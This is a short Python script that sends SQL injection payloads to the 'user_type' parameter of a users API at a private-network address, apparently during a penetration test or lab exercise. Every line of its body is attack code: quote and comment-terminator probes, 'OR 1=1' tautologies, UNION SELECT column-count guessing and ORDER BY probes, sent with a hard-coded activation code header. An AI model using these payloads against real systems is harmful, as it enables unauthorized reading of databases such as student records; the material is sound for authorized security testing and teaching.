#!/usr/bin/env python3
import requests

BASE_URL = "http://192.168.100.110:3333"
HEADERS = {"x-activate-code": "8d7a77ae-dac9-4397-afd6-44b92fd5b6f7"}


def check(payload, desc):
    params = {"user_type": payload, "fields": "student_id,name"}
    try:
        resp = requests.get(f"{BASE_URL}/api/v1/users", params=params, headers=HEADERS)
        print(f"[{resp.status_code}] {desc} => Payload: {payload}")
        if resp.status_code == 200:
            print(f"    Output: {resp.text[:100]}...")
    except Exception as e:
        print(f"[ERR] {e}")


print("=== Debugging Injection Point ===")

# Baseline
check("students", "Baseline (valid)")
check("invalid_user_type_xyz", "Baseline (invalid)")

# Quotes
check("students'", "Single Quote")
check('students"', "Double Quote")

# Comments
check("students' --", "Comment (dash dash)")
check("students' -- ", "Comment (dash dash space)")
check("students' #", "Comment (hash)")
check("students' /*", "Comment (C-style)")

# Boolean
check("students' OR '1'='1", "Boolean True")
check("students' AND '1'='1", "Boolean True (AND)")
check("students' AND '1'='2", "Boolean False (AND)")

# Union Simple Guesses
check("students' UNION SELECT 1 -- ", "Union 1 col")
check("students' UNION SELECT 1,2 -- ", "Union 2 cols")
check("students' UNION SELECT 1,2,3 -- ", "Union 3 cols")
check("students' UNION SELECT 1,2,3,4 -- ", "Union 4 cols")
check("students' UNION SELECT 1,2,3,4,5 -- ", "Union 5 cols")

# Order By
check("students' ORDER BY 1 -- ", "Order By 1")
check("students' ORDER BY 100 -- ", "Order By 100")
